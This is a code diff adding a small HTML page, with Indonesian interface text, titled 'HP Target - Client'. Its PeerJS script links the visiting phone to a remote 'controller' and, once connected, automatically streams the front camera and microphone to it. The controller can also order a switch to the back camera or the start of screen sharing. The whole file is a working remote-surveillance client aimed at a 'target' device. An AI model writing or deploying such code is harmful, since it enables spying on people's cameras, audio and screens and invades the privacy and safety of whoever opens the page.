@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HP Target - Client</title>
+  <style>
+    body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }
+    .box { padding: 15px; background: #2a2a2a; border-radius: 8px; margin-top: 20px; }
+  </style>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body>
+
+  <h2>Koneksi Remote</h2>
+  <div class="box">
+    <p id="status">Menghubungkan ke Pengontrol...</p>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const controllerPeerId = urlParams.get('peerId');
+    const peer = new Peer();
+    let currentCall;
+    let localStream;
+
+    peer.on('open', () => {
+      if (!controllerPeerId) {
+        document.getElementById('status').innerText = 'ID Pengontrol tidak ditemukan.';
+        return;
+      }
+
+      const conn = peer.connect(controllerPeerId);
+      conn.on('open', () => {
+        document.getElementById('status').innerText = 'Terhubung ke Pengontrol. Memulai Kamera...';
+        startCamera('user');
+      });
+
+      conn.on('data', (cmd) => {
+        if (cmd === 'cam-front') startCamera('user');
+        if (cmd === 'cam-back') startCamera('environment');
+        if (cmd === 'share-screen') startScreenShare();
+      });
+    });
+
+    async function startCamera(facingMode) {
+      if (localStream) localStream.getTracks().forEach(t => t.stop());
+
+      try {
+        localStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode },
+          audio: true
+        });
+        document.getElementById('status').innerText = `Kamera Aktif (${facingMode === 'user' ? 'Depan' : 'Belakang'})`;
+        sendStream(localStream);
+      } catch (err) {
+        alert('Akses kamera ditolak.');
+      }
+    }
+
+    async function startScreenShare() {
+      try {
+        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+        if (localStream) localStream.getTracks().forEach(t => t.stop());
+        localStream = screenStream;
+        document.getElementById('status').innerText = 'Sedang Berbagi Layar...';
+        sendStream(localStream);
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    function sendStream(stream) {
+      if (currentCall) currentCall.close();
+      currentCall = peer.call(controllerPeerId, stream);
+    }
+  </script>
+</body>
+</html>
